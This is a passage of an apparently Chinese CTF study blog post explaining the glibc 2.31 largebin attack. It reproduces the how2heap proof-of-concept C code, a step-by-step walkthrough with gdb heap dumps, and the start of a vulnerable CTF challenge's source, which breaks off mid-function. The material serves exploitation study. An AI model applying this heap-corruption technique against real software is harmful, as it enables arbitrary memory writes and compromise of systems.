    <id>lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-07T15:06:30.390Z</published>
    <updated>2021-11-08T13:30:17.619Z</updated>
    
    <content type="html"><![CDATA[<p>一直以为在2.31补丁后，Large bin Attack 就无法使用了。在打比赛bsidesahmedabad CTF时，才发现原来在2.31 下也有骚操作来利用Large bin来进行attack。（唉<del>~</del>(◞‸◟ )tcl…）<a id="more"></a></p><h2 id="Large-bin-Attack目的"><a href="#Large-bin-Attack目的" class="headerlink" title="Large bin Attack目的"></a>Large bin Attack目的</h2><p>Large bin Attack的目的是 利用Large bin 向任意一地址任意一个地址写入一个大数(p2 chunk addr).</p><h2 id="how2heap-源码学习"><a href="#how2heap-源码学习" class="headerlink" title="how2heap 源码学习"></a>how2heap 源码学习</h2><p>经过信息收集，发现在how2heap中更新了Large bin Attack 源码。(ps:菜鸡才知道正版<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>项目有团队在不断维护，中文翻译版how2heap已经没有维护了，啊这…..)</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">        fwd = bck;</span></span><br><span class="line"><span class="comment">        bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 1 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Check 2 : \n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;    if (bck-&gt;fd != fwd)\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt;        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Once again, allocate a guard chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"At this point, we have one chunk in large bin [p1] (%p),\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"               and one chunk in unsorted bin [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n"</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"  the modified p1-&gt;bk_nextsize does not trigger any error\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n"</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n"</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Target (%p) : %p\n"</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"====================================================================\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="新保护"><a href="#新保护" class="headerlink" title="新保护"></a>新保护</h3><p>由上文源码所说，在2.30后libc 增加了两个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#check 1：</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n<span class="string">");</span></span><br><span class="line">  malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)\n");</span><br><span class="line"><span class="meta">#check 2:</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This prevents the traditional large bin attack\n"</span>);</span><br></pre></td></tr></table></figure><p>先说check 2：对当前bin的bk值对应bin的 fd是否为当前bin。</p><p>check 1 对largebin的bk_nextsize进行了跟bk一样的检查，即当前bin的bk_nextsize值对应bin的 fd_nextsize是否为当前bin。</p><h3 id="新利用点"><a href="#新利用点" class="headerlink" title="新利用点"></a>新利用点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这源码中，核心就是利用这段代码。这部分完整的源码在<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3831</a></p><p>这个代码在unsorted bin加入largebin时，若unsorted bin 大小大于目前最大largebin时触发。在触发时，被未对<code>fd_nextsize</code>和<code>bk_nextsize</code>进行检查，就直接向<code>victim-&gt;bk_nextsize-&gt;fd_nextsize</code>写入victim的地址。</p><h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>首先我们如下写创建4个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Here is the target we want to overwrite (%p) : %lu\n\n"</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"First, we allocate a large chunk [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"And another chunk to prevent consolidate\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We also allocate a second large chunk [p2]  (%p).\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This chunk should be smaller than [p1] and belong to the same large bin.\n"</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the larger of the two --&gt; [p1] (%p)\n"</span>,p1<span class="number">-2</span>);</span><br><span class="line"> <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Allocate a chunk larger than [p1] to insert [p1] into large bin\n"</span>);</span><br></pre></td></tr></table></figure><p>让p1 加入了larger bin，此时:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>然后释放p2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Free the smaller of the two --&gt; [p2] (%p)\n"</span>,p2<span class="number">-2</span>);</span><br><span class="line">p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);<span class="comment">//修改p1 bk_nextsize 为target+0x20</span></span><br></pre></td></tr></table></figure><p>此时p2为unsortedbin：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x55f31dd5ea30 —▸ 0x7f0c129bbbe0 (main_arena+96) ◂— 0x55f31dd5ea30</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x55f31dd5e5e0 —▸ 0x7f0c129bbfd0 (main_arena+1104) ◂— 0x55f31dd5e5e0</span><br></pre></td></tr></table></figure><p>此时P1的内存分布为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;36gx 0x55f31dd5e5e0</span><br><span class="line">0x55f31dd5e5e0: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x55f31dd5e5f0: 0x00007f0c129bbfd0      0x00007f0c129bbfd0</span><br><span class="line">0x55f31dd5e600: 0x000055f31dd5e5e0      0x00007f0c129bee30 （target+0x20)</span><br><span class="line">0x55f31dd5e610: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e620: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f31dd5e630: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>然后我们再让p2进入larger bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n"</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br></pre></td></tr></table></figure><p>这时，由于p1&gt;p2,我们的攻击将进行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">//victim在例子中p2</span></span><br><span class="line"><span class="comment">//victim-&gt;bk_nextsize-&gt;fd_nextsize 为我们修改的p1-&gt;bk_nextsize的值</span></span><br><span class="line"><span class="comment">//fwd-&gt;fd-&gt;bk_nextsize为p1-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure><p>,在target处写入p2地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f0c129bee30:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee40:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee50:   0x000055f31dd5ea30      0x0000000000000000</span><br><span class="line">0x7f0c129bee60:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f0c129bee70:   0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="例题-bsidesahmedabad-2021-padnote"><a href="#例题-bsidesahmedabad-2021-padnote" class="headerlink" title="例题_bsidesahmedabad_2021_padnote"></a>例题_bsidesahmedabad_2021_padnote</h2><p>题目环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECK_FAIL(ERR) &#123;                       \</span></span><br><span class="line">    <span class="built_in">puts</span>(ERR);                                  \</span><br><span class="line">    <span class="keyword">return</span>;                                     \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NOTE 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line">&#125; Note;</span><br><span class="line"></span><br><span class="line">Note noteList[MAX_NOTE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadLine</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="built_in">size</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, &amp;c, <span class="keyword">sizeof</span>(c)) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>); <span class="comment">// IO error</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'\n'</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      buf[i] = c;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">  <span class="keyword">char</span> *content;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is in use"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input data length */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>, &amp;<span class="built_in">size</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// IO error</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Security check */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">size</span> &lt;= <span class="number">0</span>)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Size must be larger than 0"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize note */</span></span><br><span class="line">  <span class="keyword">if</span> (!(content = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">size</span>)))</span><br><span class="line">    CHECK_FAIL(<span class="string">"Could not allocate the memory"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Input content */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  ReadLine(content, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">  note-&gt;content = content;</span><br><span class="line">  note-&gt;<span class="built_in">size</span> = <span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EditNote</span><span class="params">(Note *note)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> offset, count, epos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if note is empty */</span></span><br><span class="line">  <span class="keyword">if</span> (!note-&gt;content)</span><br><span class="line">    CHECK_FAIL(<span class="string">"Note is 